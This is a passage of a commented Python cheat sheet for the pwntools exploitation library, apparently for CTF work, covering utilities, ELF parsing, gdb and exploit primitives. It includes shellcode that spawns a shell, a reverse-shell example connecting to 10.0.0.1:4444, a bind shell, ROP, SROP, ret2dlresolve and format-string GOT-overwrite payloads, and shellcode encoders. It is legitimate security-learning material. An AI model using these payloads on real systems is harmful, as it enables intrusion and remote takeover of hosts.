#   proc.exe(1234)                   # '/usr/bin/target' (what /proc/pid/exe -> )
#   proc.cwd(1234)                   # process current working directory
#   proc.name(1234)                  # process name from /proc/pid/status
#   proc.cmdline(1234)               # ['./target', '--flag']
#   proc.state(1234)                 # 'S' (sleeping), 'R', 'Z', ...
#
# Memory maps, and process relationships (parent/children/ancestors).
#
#   from pwn import *
#   proc.memory_maps(1234)           # list of mapping dicts (addr ranges, perms)
#   proc.parent(1234)                # parent PID
#   proc.children(1234)              # [child PIDs]
#
# Debugger detection: tracer() gives the tracing PID; wait_for_debugger()
# blocks until the process is under ptrace (e.g. gdb attached).
#
#   from pwn import *
#   proc.tracer(1234)                # PID of gdb/strace tracing it, or None
#   proc.wait_for_debugger(1234)     # block until a debugger attaches
#
# ==============================================================================
# pwnlib.util.sh_string — safely quote data for /bin/sh
# https://docs.pwntools.com/en/stable/util/sh_string.html
# ==============================================================================
#
# sh_string(): quote/escape one argument so a POSIX shell treats it literally.
# Use it whenever you inject attacker-controlled data into a shell command.
#
#   from pwn import *
#   sh_string("foo bar")             # "'foo bar'"
#   sh_string("foo'bar")             # "'foo'\\''bar'"  (safe single-quote escape)
#   cmd = 'cat ' + sh_string(filename)   # never string-format raw input
#
# sh_prepare(): build 'VAR=value; ...' assignments from a dict (optionally export).
# sh_command_with(): build a command, escaping each argument, via fmt or callable.
#
#   from pwn import *
#   sh_prepare({'X': 'foo bar'})                     # b"X='foo bar'"
#   sh_prepare({'FLAG': 'a b'}, export=True)         # b"export FLAG='a b'"
#   sh_command_with('/bin/echo %s', '\x01\n')        # "/bin/echo '\\x01\\n'"
#
# ==============================================================================
# pwnlib.util.hashes — hash bytes or files (binary or hex output)
# https://docs.pwntools.com/en/stable/util/hashes.html
# ==============================================================================
#
# Naming: <algo>sum (bytes in, raw digest), <algo>sumhex (hex string),
# <algo>file / <algo>filehex (hash a file by path). algos: md5, sha1,
# sha224/256/384/512, sha3_*, blake2b, blake2s.
#
#   from pwn import *
#   md5sumhex(b'hello')              # '5d41402abc4b2a76b9719d911017c592'
#   sha1sumhex(b'hello')             # 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d'
#   sha256sumhex(b'hello')           # 64-char hex digest
#   md5sum(b'hello')                 # raw 16-byte digest
#   sha256filehex('/bin/ls')         # hash a file on disk (hex)
#   md5filehex('/etc/passwd')        # file digest, hex
#
# ==============================================================================
# pwnlib.util.crc — CRC checksums (100+ standard models + custom)
# https://docs.pwntools.com/en/stable/util/crc.html
# ==============================================================================
#
# crc.crc32(): common CRC-32. crc.cksum(): matches the UNIX `cksum` tool.
#
#   from pwn import *
#   crc.crc32(b'123456789')          # 0xcbf43926
#   crc.cksum(b'123456789')          # same value as `cksum` command
#
# Named models crc.<model>(data): e.g. crc_16_xmodem, crc_16_modbus,
# crc_8_bluetooth, crc_32_bzip2, crc_64_xz. See docs for the full catalogue.
#
#   from pwn import *
#   crc.crc_16_xmodem(b'123456789')  # 0x31c3
#   crc.crc_16_modbus(b'123456789')  # 0x4b37
#   crc.crc_8_bluetooth(b'123456789')
#
# generic_crc(): roll your own with polynomial/width/init/reflect/xorout.
#
#   from pwn import *
#   crc.generic_crc(b'123456789', 0x04C11DB7, 32, 0xffffffff, True, True, 0xffffffff)
#
# ==============================================================================
# pwnlib.util.iters — brute forcing and iterator helpers
# https://docs.pwntools.com/en/stable/util/iters.html
# ==============================================================================
#
# bruteforce(): try strings from alphabet until func returns truthy.
# method: 'upto' (len 0..n), 'fixed' (exactly n), 'downfrom'.
#
#   from pwn import *
#   import string
#   # find a 4-char suffix whose sha256 starts with '0000' (PoW challenge)
#   bruteforce(lambda s: sha256sumhex((prefix+s).encode()).startswith('0000'),
#              string.ascii_lowercase, 4, method='fixed')
#
# mbruteforce(): same idea but multithreaded (defaults to CPU-core count).
#
#   from pwn import *
#   import string
#   mbruteforce(lambda s: check(s), string.digits, 6, threads=8)
#
# Iterator utilities: group/chunked (fixed-size chunks), consume (skip n),
# lookahead (peek at index n without consuming).
#
#   from pwn import *
#   list(iters.group(3, b'AAAABBBB', fill_value=0))  # [(65,65,65),(65,66,66),(66,0,0)]
#   it = iter(range(10)); iters.consume(3, it); next(it)   # -> 3 (skipped 0,1,2)
#   iters.lookahead(2, range(10))                          # 2  (peek, no advance)
#
# ==============================================================================
# pwnlib.util.lists — list/sequence helpers
# https://docs.pwntools.com/en/stable/util/lists.html
# ==============================================================================
#
# group(n, lst): split a sequence into n-sized chunks.
# underfull_action controls a short final chunk ('ignore'/'drop'/'fill').
#
#   from pwn import *
#   group(4, b'AAAABBBBCC')                       # [b'AAAA', b'BBBB', b'CC']
#   group(4, b'AAAABBBBCC', 'fill', fill_value=0) # last chunk padded to 4
#
# findall(): all indices where a subsequence occurs (KMP).
# ordlist()/unordlist(): bytes/str <-> list of int char codes.
#
#   from pwn import *
#   list(findall(b'abcabcabc', b'abc'))   # [0, 3, 6]
#   ordlist(b'ABC')                       # [65, 66, 67]
#   unordlist([65, 66, 67])               # 'ABC'
#
# partition(): split into sublists keyed by a function's return value.
#
#   from pwn import *
#   partition(range(10), lambda x: x % 2)         # [[0,2,4,6,8], [1,3,5,7,9]]
#   partition(range(6), lambda x: x % 2, save_keys=True)  # OrderedDict {0:..,1:..}
#
# ==============================================================================
# pwnlib.util.net — network interface and sockaddr helpers
# https://docs.pwntools.com/en/stable/util/net.html
# ==============================================================================
#
# sockaddr(): build a raw struct sockaddr buffer (handy in shellcode payloads).
# Returns (bytes, length, address_family_constant).
#
#   from pwn import *
#   buf, length, family = sockaddr('127.0.0.1', 1337)          # IPv4
#   buf, length, family = sockaddr('::1', 1337, network='ipv6')  # IPv6
#
# Enumerate local interfaces and their addresses.
#
#   from pwn import *
#   interfaces()          # {'eth0': [(family, 'addr'), ...], ...}
#   interfaces4()         # {'eth0': ['192.168.1.10'], ...}  IPv4 only
#   getifaddrs()          # list of raw ifaddrs dicts (name/flags/family/addr)
#
# ==============================================================================
# pwnlib.util.web — download files over HTTP
# https://docs.pwntools.com/en/stable/util/web.html
# ==============================================================================
#
# wget(): fetch a URL; save=True auto-names the file, or pass a filename.
#
#   from pwn import *
#   data = wget('https://example.com/flag')            # return content as bytes
#   wget('https://example.com/libc.so.6', save=True)   # save, name from URL
#   wget('https://example.com/x', save='out.bin', timeout=10)  # explicit name
#
# ==============================================================================
# pwnlib.util.safeeval — evaluate untrusted expressions safely
# https://docs.pwntools.com/en/stable/util/safeeval.html
# ==============================================================================
#
# const(): only Python literals (numbers/strings/lists/dicts), no operations.
# Safe way to parse server-sent literal data instead of eval().
#
#   from pwn import *
#   safeeval.const('[1, 2, 3]')          # [1, 2, 3]
#   safeeval.const('0xdead')             # 57005
#
# expr(): allows math/operations but no names, calls, imports or attribute access.
# values(): like expr() but resolves names from a supplied dict.
#
#   from pwn import *
#   safeeval.expr('2 * (3 + 4)')                 # 14
#   safeeval.values('x + y', {'x': 10, 'y': 5})  # 15  (names from dict)
#
#
# ==============================================================================
# pwnlib.asm — assemble/disassemble code and build runnable ELFs
# https://docs.pwntools.com/en/stable/asm.html
# ==============================================================================
#
# Set the target architecture on context BEFORE assembling. Everything below
# (asm, shellcraft, constants, encoders) reads context.arch / context.os.
#
#   from pwn import *
#   context.arch = 'amd64'          # or 'i386', 'arm', 'aarch64', 'mips', 'thumb'
#   context.os   = 'linux'          # default is linux
#   context.update(arch='amd64', os='linux')   # set several at once
#
# asm(code) assembles an instruction string to raw machine-code bytes.
# Needs the GNU assembler (binutils) for the target arch installed.
#
#   from pwn import *
#   context.arch = 'amd64'
#   asm('mov rax, 0x3b')            # b'\x48\xc7\xc0\x3b\x00\x00\x00'
#   asm('nop; ret')                 # multiple instrs separated by ; or newlines
#   asm('mov eax, SYS_execve', arch='i386')   # per-call arch override kwarg
#   asm('mov rax, 60', vma=0x400000)          # set base virtual address
#
# disasm(bytes) turns raw machine code back into readable assembly.
#
#   from pwn import *
#   context.arch = 'amd64'
#   print(disasm(b'\x90\x90'))                 # 0: 90 nop / 1: 90 nop
#   print(disasm(asm('mov rax, 0x3b')))        # mov rax, 0x3b
#   print(disasm(unhex('b85d000000'), arch='i386'))   # mov eax, 0x5d
#
# Labels and relative jumps work like a normal assembler.
#
#   from pwn import *
#   context.arch = 'amd64'
#   code = '''
#   loop:
#       inc rax
#       cmp rax, 10
#       jne loop
#   '''
#   sc = asm(code)
#
# Assemble shellcraft templates straight to bytes (the common idiom).
#
#   from pwn import *
#   context.arch = 'amd64'
#   shellcode = asm(shellcraft.sh())           # execve('/bin/sh') as bytes
#
# make_elf(bytes) wraps raw machine code into a runnable ELF executable.
# make_elf_from_assembly(code) does the same from an assembly listing (keeps symbols).
#
#   from pwn import *
#   context.arch = 'amd64'
#   sc = asm(shellcraft.sh())
#   elf_bytes = make_elf(sc)                    # returns ELF as bytes (extract=True)
#   path = make_elf(sc, extract=False)          # returns path to ELF file instead
#   path = make_elf_from_assembly(shellcraft.sh())    # returns ELF path
#   # write(path,'/tmp/sh'); os.chmod('/tmp/sh',0o755); process('/tmp/sh').interactive()
#
# ==============================================================================
# pwnlib.shellcraft — templated shellcode generators (return assembly strings)
# https://docs.pwntools.com/en/stable/shellcraft.html
# ==============================================================================
#
# shellcraft is namespaced by arch then OS: shellcraft.<arch>.<os>.<template>.
# The bare shellcraft.foo() uses the current context.arch. Templates return an
# assembly *string* — wrap with asm() to get bytes.
#
#   from pwn import *
#   context.arch = 'amd64'
#   src = shellcraft.sh()                       # assembly string for current arch
#   src = shellcraft.amd64.linux.sh()           # fully-qualified equivalent
#   src = shellcraft.i386.linux.sh()            # explicit 32-bit x86
#   shellcode = asm(shellcraft.sh())            # the standard idiom -> bytes
#
# Spawn a shell via execve('/bin/sh'). execve(path, argv, envp) is the general form.
#
#   from pwn import *
#   context.arch = 'amd64'
#   asm(shellcraft.amd64.linux.sh())
#   asm(shellcraft.amd64.linux.execve('/bin/sh', 0, 0))   # argv=0, envp=0
#   asm(shellcraft.execve('/bin/sh', ['/bin/sh', '-c', 'id'], 0))
#
# Read and print a file (great for CTF flags). cat(filename, fd=1).
#
#   from pwn import *
#   context.arch = 'amd64'
#   asm(shellcraft.cat('/flag'))                # open+read+write /flag to stdout
#   asm(shellcraft.amd64.linux.cat('/flag', fd=1))
#
# dupsh(sock) redirects a socket/fd to stdio then spawns a shell (post-connect).
#
#   from pwn import *
#   context.arch = 'amd64'
#   asm(shellcraft.dupsh(4))                    # dup fd 4 to stdin/out/err + sh
#
# Networking: connect(host, port) then dup+shell (reverse shell); bindsh(port) (bind shell);
# findpeersh() reuses an existing accepted socket then spawns a shell.
#
#   from pwn import *
#   context.arch = 'amd64'
#   asm(shellcraft.connect('10.0.0.1', 4444) + shellcraft.dupsh('rbp'))  # reverse
#   asm(shellcraft.bindsh(4444, 'ipv4'))        # bind shell on tcp/4444
#   asm(shellcraft.findpeersh())                # find peer socket then sh
#
# Raw syscalls read(fd, buf, count) / write(fd, buf, count) for I/O.
#
#   from pwn import *
#   context.arch = 'amd64'
#   asm(shellcraft.read(0, 'rsp', 100))         # read up to 100 bytes into stack
#   asm(shellcraft.write(1, 'rsp', 100))        # write 100 bytes from stack to stdout
#
# echo(string, sock='1') prints a literal string; pushstr(s) puts a string on the
# stack (no null/newline bytes) leaving a pointer to it; infloop() is a 2-byte hang.
#
#   from pwn import *
#   context.arch = 'amd64'
#   asm(shellcraft.echo('hello\n', 1))          # write string to fd 1
#   asm(shellcraft.pushstr('/bin/sh'))          # push "/bin/sh\0" onto stack
#   asm(shellcraft.pushstr('data', append_null=False))
#   asm(shellcraft.infloop())                   # b'\xeb\xfe' — spin forever (debug)
#
# ==============================================================================
# pwnlib.constants — syscall numbers / flags that track context.arch & os
# https://docs.pwntools.com/en/stable/constants.html
# ==============================================================================
#
# Symbolic constants whose integer values depend on context.arch/os. They act as
# both names and ints, so they drop straight into asm() strings and shellcraft.
#
#   from pwn import *
#   context.arch = 'amd64'
#   int(constants.SYS_execve)                   # 59 on amd64 (differs on i386)
#   int(constants.O_RDONLY)                     # 0
#   str(constants.SYS_execve)                   # 'SYS_execve'
#   hex(constants.SYS_mmap)                     # value adjusts to arch
#
# Values are arch-specific — check by switching context, or address explicitly.
#
#   from pwn import *
#   with context.local(arch='i386'):
#       int(constants.SYS_execve)               # 11 on i386
#   int(constants.linux.amd64.SYS_execve)       # 59  (fully-qualified access)
#   int(constants.linux.i386.SYS_execve)        # 11
#
# Combine flags with | and use them directly in code you assemble.
#
#   from pwn import *
#   context.arch = 'amd64'
#   prot = constants.PROT_READ | constants.PROT_WRITE            # 3
#   flags = constants.MAP_ANONYMOUS | constants.MAP_PRIVATE
#   asm('mov rax, SYS_mmap')                     # names resolved by the assembler
#   asm(f'mov rsi, {int(prot)}')                 # or interpolate the int value
#
# ==============================================================================
# pwnlib.encoders — rewrite shellcode to avoid bad bytes (nulls, newlines, etc.)
# https://docs.pwntools.com/en/stable/encoders.html
# ==============================================================================
#
# encode(raw, avoid) returns equivalent shellcode containing none of the avoid
# bytes, prepending a decoder stub as needed. Encoders depend on context.arch.
#
#   from pwn import *
#   context.arch = 'i386'
#   sc = asm(shellcraft.sh())
#   enc = encoders.encode(sc, avoid=b'\x00\x0a')   # avoid NUL and newline
#   assert b'\x00' not in enc and b'\x0a' not in enc
#
# Convenience wrappers for common constraints (same behaviour as encode()).
#
#   from pwn import *
#   context.arch = 'i386'
#   sc = asm(shellcraft.sh())
#   encoders.null(sc)                            # strip NUL bytes
#   encoders.line(sc)                            # strip NUL + whitespace
#   encoders.alphanumeric(sc)                    # output only [A-Za-z0-9]
#   encoders.printable(sc)                       # only printable non-space bytes
#
# XOR / scramble encoders build a self-decoding stub (arch-specific: i386/arm/mips).
#
#   from pwn import *
#   context.arch = 'i386'
#   sc = asm(shellcraft.sh())
#   encoders.i386.xor.encode(sc, avoid=b'\x00')  # xor decoder stub + payload
#   encoders.scramble(sc, avoid=b'\x00')         # pick a random working encoder
#
# ==============================================================================
# pwnlib.runner — assemble/run shellcode locally for quick testing
# https://docs.pwntools.com/en/stable/runner.html
# ==============================================================================
#
# run_assembly(code) assembles and executes a listing, returning a process tube.
# run_shellcode(bytes) does the same for already-assembled machine code.
#
#   from pwn import *
#   context.arch = 'amd64'
#   io = run_assembly(shellcraft.echo('hi\n', 1))   # -> process tube
#   print(io.recvall())                             # b'hi\n'
#   io = run_shellcode(asm(shellcraft.sh()))        # interactive /bin/sh
#   io.sendline(b'id'); print(io.recvline())
#
# *_exitcode variants run to completion and return the integer exit status.
#
#   from pwn import *
#   context.arch = 'i386'
#   run_assembly_exitcode('mov ebx, 3; mov eax, SYS_exit; int 0x80;')   # 3
#   run_shellcode_exitcode(asm('xor ebx,ebx; mov eax,1; int 0x80'))     # 0
#
#
# ==============================================================================
# pwnlib.elf.elf — parse ELF binaries: symbols, GOT/PLT, addresses, rebasing
# https://docs.pwntools.com/en/stable/elf/elf.html
# ==============================================================================
#
# Load an ELF (binary or shared lib) to read symbols/sections/security info.
# Setting context.binary = elf also sets arch/bits/endianness automatically.
#
#   from pwn import *
#   elf = ELF('./chall')                 # parse the target binary
#   context.binary = elf                 # sets context.arch/bits/os from ELF
#   libc = ELF('libc.so.6', checksec=False)  # parse a shared library too
#
# Symbol / GOT / PLT lookups (dicts keyed by name). sym is an alias of symbols.
#
#   elf.symbols['main']                  # vaddr of main
#   elf.sym['main']                      # same thing, shorthand
#   elf.got['puts']                      # GOT entry addr (where puts ptr lives)
#   elf.plt['puts']                      # PLT stub addr (call to jump to puts)
#   elf.functions['main'].address        # Function objs: .address .size .name
#
# Base address & rebasing. For PIE, elf.address starts 0; set it to the leaked
# base and ALL symbols/got/plt/functions rebase automatically.
#
#   elf.address                          # current load base (0 for PIE preload)
#   elf.entry                            # entry point vaddr (a.k.a. elf.entrypoint)
#   elf.address = 0x555555554000         # rebase PIE binary to leaked base
#   # for libc: leak a known func addr, then anchor the whole library:
#   libc.address = leaked_puts - libc.sym['puts']   # rebase libc from a leak
#   system = libc.sym['system']          # now resolves to real runtime addr
#   binsh  = next(libc.search(b'/bin/sh\x00'))       # find "/bin/sh" string
#
# .bss / searching / reading memory from the file image.
#
#   elf.bss()                            # .bss start vaddr
#   elf.bss(0x40)                        # .bss + 0x40 (scratch write area)
#   next(elf.search(b'/bin/sh'))         # search returns a generator of vaddrs
#   next(elf.search(asm('jmp rsp'), executable=True))  # search exec segments
#   elf.read(elf.sym['flag'], 32)        # read 32 bytes at a vaddr -> bytes
#   elf.write(elf.sym['x'], b'\x01')     # patch bytes in the ELF object
#   elf.string(elf.sym['msg'])           # read NUL-terminated string
#   elf.save('./patched')                # write modified ELF back to disk
#
# Security mitigations (booleans) + a printed summary.
#
#   elf.checksec()                       # prints RELRO/Canary/NX/PIE summary
#   elf.pie      # bool: position independent
#   elf.canary   # bool: stack canary present
#   elf.nx       # bool: non-executable stack
#   elf.relro    # 'Full' | 'Partial' | None
#
# Build an ELF from raw bytes / translate vaddr<->file offset.
#
#   sc = ELF.from_bytes(b'\x90\x90\xcc', vma=0x1000)  # wrap shellcode as ELF
#   elf.vaddr_to_offset(elf.sym['main'])  # vaddr -> file offset (None if unmapped)
#   elf.offset_to_vaddr(0x1234)           # file offset -> vaddr
#
# ==============================================================================
# pwnlib.elf.corefile — read register/memory state from a crash core dump
# https://docs.pwntools.com/en/stable/elf/corefile.html
# ==============================================================================
#
# A Corefile captures registers/memory at crash time — great for auto-finding
# the exact overflow offset and inspecting the fault. Get one from a process or
# load a core file directly.
#
#   from pwn import *
#   p = process('./chall')
#   p.sendline(cyclic(200))              # send a cyclic pattern to crash it
#   p.wait()                             # let it die and dump core
#   core = p.corefile                    # Corefile from the crashed process
#   core = Corefile('./core')            # ...or load an existing core file
#
# Inspect registers and the fault; recover the crash offset with cyclic_find.
#
#   core.registers                       # dict of all registers {'rax':..., ...}
#   core.rsp, core.rip, core.rdi         # arch-specific register attributes
#   core.pc, core.sp                     # arch-independent aliases
#   core.fault_addr                      # address that caused SIGSEGV/SIGBUS
#   core.signal                          # signal number that killed it
#   offset = cyclic_find(core.rsp)       # bytes until we control saved RIP/RSP
#
# Read crash-time memory, stack, and environment.
#
#   core.read(core.rsp, 64)              # read memory at a vaddr -> bytes
#   core.string(addr)                    # NUL-terminated string at addr
#   core.stack                           # stack memory mapping object
#   core.getenv('PATH')                  # address of an env var on the stack
#
# ==============================================================================
# pwnlib.rop.rop — automatically build ROP chains from gadgets in ELF(s)
# https://docs.pwntools.com/en/stable/rop/rop.html
# ==============================================================================
#
# ROP() scans one or more ELFs for gadgets and lets you assemble a chain by
# high-level calls; pass a list to combine binary + libc gadgets.
#
#   from pwn import *
#   elf = context.binary = ELF('./chall')
#   rop = ROP(elf)                       # gadgets from the main binary
#   rop = ROP([elf, libc])               # combine gadgets from several ELFs
#   rop = ROP(elf, base=0x7fffffffe000)  # optional known stack base
#
# High-level calls: resolves symbol + arranges args into the right registers.
# Any ELF symbol/known func becomes a method; call() is the general form.
#
#   rop.call('system', [next(elf.search(b'/bin/sh\x00'))])  # system("/bin/sh")
#   rop.system(next(elf.search(b'/bin/sh')))                # shorthand method
#   rop.puts(elf.got['puts'])            # puts(got.puts) -> leak libc addr
#   rop.call(elf.sym['main'])            # return to main to loop again
#   rop.execve(binsh, 0, 0)              # execve("/bin/sh", NULL, NULL)
#
# Register control: assign directly; ROP picks the right pop gadget(s).
#
#   rop.rdi = next(elf.search(b'/bin/sh'))  # pop rdi ; ret -> set rdi
#   rop.rax = 0x3b                          # set syscall number
#   rop(rax=0x3b, rdi=binsh, rsi=0, rdx=0)  # set several regs at once
#   rop.raw(0xdeadbeef)                     # append a raw qword/bytes/list
#   rop.raw(rop.ret)                        # stack-align with a bare ret
#
# Gadget discovery and pivots.
#
#   rop.find_gadget(['pop rdi', 'ret'])  # exact instruction-sequence gadget
#   rop.search(regs=['rdi'], move=0, order='size')  # gadget popping rdi
#   rop.ret                              # a 'ret' gadget (for alignment)
#   rop.migrate(0x404800)                # stack pivot via 'leave ; ret'
#   rop.ret2csu(edi=0, rsi=buf, rdx=0)   # __libc_csu_init multi-reg control
#
# Emit the chain and debug it.
#
#   payload = rop.chain()                # chain as bytes
#   payload = bytes(rop)                 # same as .chain()
#   print(rop.dump())                    # human-readable annotated chain
#
# ==============================================================================
# pwnlib.rop.srop — SigreturnFrame: fake a signal frame to set ALL registers
# https://docs.pwntools.com/en/stable/rop/srop.html
# ==============================================================================
#
# SROP forges a sigreturn frame so one 'syscall; ret' (with rax=15/SYS_rt_sigreturn)
# pops every register. Useful when gadgets are scarce. Supported: i386, amd64,
# arm, aarch64, mips(el). Set the syscall reg per arch (amd64: rax).
#
#   from pwn import *
#   context.arch = 'amd64'
#   frame = SigreturnFrame()             # blank frame for current arch
#   frame.rax = constants.SYS_execve     # syscall number to run (execve)
#   frame.rdi = binsh                    # arg1: "/bin/sh" address
#   frame.rsi = 0                        # arg2: argv = NULL
#   frame.rdx = 0                        # arg3: envp = NULL
#   frame.rip = syscall_ret              # a 'syscall ; ret' gadget address
#   frame.rsp = safe_stack               # keep rsp valid to avoid a crash
#   payload  = bytes(frame)              # serialize frame to send
#
# Typical trigger: pop rax=15, hit a syscall (sigreturn), then the frame runs.
#
#   rop = ROP(elf)
#   rop.rax = constants.SYS_rt_sigreturn # 15 on amd64
#   rop.raw(syscall_ret)                 # syscall -> sigreturn consumes frame
#   payload = fit({0: b'A'*offset, offset: rop.chain() + bytes(frame)})
#
# ==============================================================================
# pwnlib.rop.ret2dlresolve — call functions with NO libc leak via the linker
# https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html
# ==============================================================================
#
# Forge fake relocation/symbol structures so the dynamic linker resolves and
# calls e.g. system("/bin/sh") for you. Great when there is no leak and lazy
# binding is on (Partial RELRO). Works on non-PIE / known addresses.
#
#   from pwn import *
#   elf = context.binary = ELF('./chall')
#   dl  = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
#
# Read the forged structs into a known writable area, then trigger resolution.
#
#   rop = ROP(elf)
#   rop.read(0, dl.data_addr)            # read our payload into dl.data_addr
#   rop.ret2dlresolve(dl)                # jump into PLT[0] to resolve+call
#   payload = fit({                      # place chain at overflow, structs later
#       offset:        rop.chain(),
#       dl.data_addr:  dl.payload,       # fake Elf_Rel/Sym/Str + "/bin/sh"
#   })
#   # or simply: payload = rop.chain() + dl.payload  (when layout allows)
#
# ==============================================================================
# pwnlib.fmtstr — build format-string write primitives (%n) automatically
# https://docs.pwntools.com/en/stable/fmtstr.html
# ==============================================================================
#
# fmtstr_payload builds a printf payload that writes chosen values to chosen
# addresses. offset = which stack arg your input starts at (find with %p probes
# or FmtStr auto-detect). numbwritten = bytes printf already emitted before you.
#
#   from pwn import *
#   context.arch = 'amd64'
#   # overwrite GOT['exit'] with win(); byte-granular writes are most reliable:
#   payload = fmtstr_payload(6, {elf.got['exit']: elf.sym['win']},
#                            write_size='byte')    # offset=6, {addr: value}
#   p.sendline(payload)
#   # options: write_size='byte'|'short'|'int', numbwritten=N (already printed)
#   payload = fmtstr_payload(6, {addr: 0xdeadbeef}, numbwritten=8, write_size='short')
#
# fmtstr_split returns (fmt, data) separately so you can assemble the payload
# yourself (e.g. when addresses must sit at a specific location).
#
#   fmt, data = fmtstr_split(6, {elf.got['puts']: elf.sym['win']})
#
# FmtStr class: give it a callback that sends a payload and returns the output;
# it auto-detects the offset, then you queue writes and flush them.
#
#   from pwn import *
#   def execute_fmt(payload):            # must send payload and return response
#       p.sendline(payload)
#       return p.recvline()
#   f = FmtStr(execute_fmt)              # offset=None -> auto-detect via leaks
#   f = FmtStr(execute_fmt, offset=6)    # ...or specify a known offset
#   f.write(elf.got['puts'], elf.sym['win'])   # queue a memory write
#   f.write(elf.got['exit'], elf.sym['win'])   # queue another
#   f.execute_writes()                   # send all queued writes via callback
#
#
# ==============================================================================
# pwnlib.gdb — launch/attach GDB, script it from Python
# https://docs.pwntools.com/en/stable/gdb.html
# ==============================================================================
#
# Start a NEW process under GDB. gdbscript runs after GDB attaches.
# Dynamically-linked binaries stop at the first ld.so instruction.
#
#   from pwn import *
#   context.binary = './chall'
#   io = gdb.debug(['./chall', 'arg1'], gdbscript='b main\nc')   # break main, continue
#   io.sendline(b'payload')
#   io.interactive()
#
# Attach GDB to an ALREADY running process (or SSH/remote-ish target).
# 'io' is a process tube; attach opens GDB in a new terminal window.
#
#   from pwn import *
#   io = process('./chall')
#   gdb.attach(io, gdbscript='''
#   b *main+42
#   commands
#   telescope $rsp 20
#   end
#   c
#   ''')
#   io.sendline(b'data')
#
# Idiomatic switch: run under GDB only when `python exploit.py GDB` is passed.
# Also common: DEBUG/NOASLR toggles via the `args` magic dict.
#
#   from pwn import *
#   io = process('./chall')
#   if args.GDB:                       # `./exploit.py GDB`
#       gdb.attach(io, gdbscript='b main\nc')
#   # pause()  # give yourself time before sending, if not using api
#
# Pick the terminal GDB spawns in (tmux is the classic setup).
#
#   from pwn import *
#   context.terminal = ['tmux', 'splitw', '-h']   # horizontal tmux split
#   # context.terminal = ['gnome-terminal', '--']
#   # context.terminal = ['x-terminal-emulator', '-e']
#
# api=True: drive GDB programmatically via io.gdb (needs rpyc, local only).
# Set breakpoints, continue synchronously, read regs/memory from Python.
#
#   from pwn import *
#   io = gdb.debug('./chall', api=True)
#   bp = io.gdb.Breakpoint('main', temporary=True)   # temp breakpoint at main
#   io.gdb.continue_and_wait()                        # run until it hits
#   rip = io.gdb.parse_and_eval('$rip')               # read a register
#   rsp = int(io.gdb.parse_and_eval('$rsp'))
#   io.gdb.execute('telescope $rsp 10')               # any GDB/pwndbg command
#   val = io.gdb.execute('x/gx $rsp', to_string=True) # capture command output
#   io.gdb.continue_nowait()                          # resume, don't block
#   io.sendline(b'go')
#
# Assemble raw shellcode and debug it directly (no source binary needed).
#
#   from pwn import *
#   sc = asm(shellcraft.sh())
#   io = gdb.debug_shellcode(sc, gdbscript='c')   # wraps bytes in an ELF, runs it
#   io.interactive()
#
# ==============================================================================
# pwnlib.dynelf — resolve remote symbols from a leak (no libc file needed)
# https://docs.pwntools.com/en/stable/dynelf.html
# ==============================================================================
#
# DynELF walks the target's ELF/link_map in memory using a leak primitive to
# find function addresses when you have NO copy of the remote libc.
# leak(addr) must return bytes read from the remote process at addr.
#
#   from pwn import *
#   io = remote('target', 1337)
#
#   def leak(addr):
#       # send addr to your read/format-string primitive, return the bytes read
#       io.sendline(b'%7$s' + p64(addr))       # example fmt-string leak
#       return io.recvline().strip() + b'\x00'
#
#   d = DynELF(leak, pointer=0x400000)         # any known pointer into a mapped ELF
#   system = d.lookup('system', 'libc')        # resolve libc's system()
#   libc_base = d.lookup(None, 'libc')          # symb=None -> library base address
#   binsh = d.lookup('str_bin_sh', 'libc')      # or just build your own /bin/sh
#   log.success('system @ %#x', system)
#
# ==============================================================================
# pwnlib.memleak — cache/align an unreliable leak into typed reads
# https://docs.pwntools.com/en/stable/memleak.html
# ==============================================================================
#
# MemLeak wraps a raw leak function, caching results and handling partial/failed
# reads so you get clean, typed accessors. Often used to feed DynELF.
# Use as a decorator or wrap a function directly.
#
#   from pwn import *
#
#   @MemLeak
#   def leak(addr):
#       # return SOME bytes at addr (may be short); None/b'' on failure
#       io.sendline(b'read %#x' % addr)
#       return io.recvn(8)
#
#   # equivalently: leak = MemLeak(raw_leak_func, reraise=False)
#
# Typed accessors (all take an address). n() reads an exact byte count,
# s() reads a C string, b/w/d/q read 1/2/4/8-byte little-endian ints, p = pointer.
#
#   from pwn import *
#   raw  = leak.n(0x601000, 16)   # exactly 16 bytes (None if any part fails)
#   byte = leak.b(0x601000)       # 1-byte value
#   dw   = leak.d(0x601000)       # 4-byte dword
#   qw   = leak.q(0x601000)       # 8-byte qword
#   ptr  = leak.p(0x601000)       # context.bytes-sized pointer
#   name = leak.s(0x601040)       # NUL-terminated C string as bytes
#   fld  = leak.field(0x601000, some_ctypes_field)  # read one struct field
#
# Prime the cache with values you already know (avoids re-leaking).
#
#   from pwn import *
#   leak.setq(0x601018, 0x7ffff7a52290)   # tell MemLeak this qword is known
#   leak.setb(0x601000, 0x7f)
#
# Handy wrappers when your primitive can't leak certain bytes.
#
#   from pwn import *
#   @MemLeak.NoNulls        # leak works but skips/handles NULL bytes
#   def leak2(addr): ...
#   # @MemLeak.NoNewlines / @MemLeak.NoWhitespace also exist
#
# ==============================================================================
# pwnlib.libcdb — identify & download a libc from leaked data
# https://docs.pwntools.com/en/stable/libcdb.html
# ==============================================================================
#
# Given a build-id, a file hash, or leaked symbol offsets, fetch the exact libc
# binary from the online libc database. Returns a local path -> load with ELF().
#
#   from pwn import *
#
#   # By GNU build-id (read from the target's .note.gnu.build-id)
#   path = libcdb.search_by_build_id('fe136e485814fee2268cf19e5c124ed0f73f4400')
#   libc = ELF(path)
#   log.info('read offset: %#x', libc.symbols.read)
#
# By file hash (md5/sha1/sha256 of the libc.so.6 you already have).
#
#   from pwn import *
#   path = libcdb.search_by_md5('7a71dafb87606f360043dcd638e411bd')
#   # path = libcdb.search_by_sha256('...'); path = libcdb.search_by_sha1('...')
#   libc = ELF(path)
#
# By leaked symbol offsets: match on the low 12 bits (3 nibbles) of >=2 symbols.
# select_index picks among multiple matches (else you're prompted interactively).
#
#   from pwn import *
#   path = libcdb.search_by_symbol_offsets({'printf': 0xc90, 'puts': 0x420},
#                                          select_index=1)
#   libc = ELF(path)
#   assert libc.sym.system  # now you have real offsets to build the ropchain
#
# Explicitly download a libc / add symbols back to a stripped libc.
#
#   from pwn import *
#   path = libcdb.search_by_build_id('69389d485a...', unstrip=False)
#   libcdb.unstrip_libc(path)        # inject debug symbols in-place (uses debuginfod)
#   # libcdb.download_libc(...) / download the matching ld.so too
